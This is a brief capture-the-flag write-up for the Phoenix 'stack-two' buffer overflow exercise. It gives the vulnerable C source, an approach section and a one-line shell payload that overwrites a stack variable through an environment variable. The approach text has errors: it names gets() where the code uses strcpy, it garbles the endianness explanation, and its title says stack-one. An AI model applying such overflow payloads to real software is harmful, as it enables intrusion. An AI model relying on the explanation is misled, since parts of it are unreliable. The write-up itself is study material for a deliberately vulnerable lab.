# Stack-One

## Source Code
```c
/*
 * phoenix/stack-two, by https://exploit.education
 *
 * The aim is to change the contents of the changeme variable to 0x0d0a090a
 *
 * If you're Russian to get to the bath room, and you are Finnish when you get
 * out, what are you when you are in the bath room?
 *
 * European!

int main(int argc, char **argv) {
  struct {
    char buffer[64];
    volatile int changeme;
  } locals;

  char *ptr;

  printf("%s\n", BANNER);

  ptr = getenv("ExploitEducation");
  if (ptr == NULL) {
    errx(1, "please set the ExploitEducation environment variable");
  }

  locals.changeme = 0;
  strcpy(locals.buffer, ptr);

  if (locals.changeme == 0x0d0a090a) {
    puts("Well done, you have successfully set changeme to the correct value");
  } else {
    printf("Almost! changeme is currently 0x%08x, we want 0x0d0a090a\n",
        locals.changeme);
  }

  exit(0);
}
```

## Approach
* Structure occupies space linearly in memory, so if we overflow the buffer we can change the ``changeme`` variable.
* ``gets()`` is always vulnerable and cause overflow through variable memory.
* There are 64 bytes of buffer and we need to just and 0x0d0a090a to modify value of ``changeme`` variable as they are expecting.
* We need to also know the endianness i.e stack grows backward and variables are allocated one above another one by one. So, we need to fiip the bytes given i.e 0a090a0d and 64 random characters before it.  
* Also we need to give that as environment variable named ExploitEducation. 

## Exploit
```shell
$ ExploitEducation=$(python -c 'print "a"*64 + "\x0a\x09\x0a\x0d"') ./stack-two
```
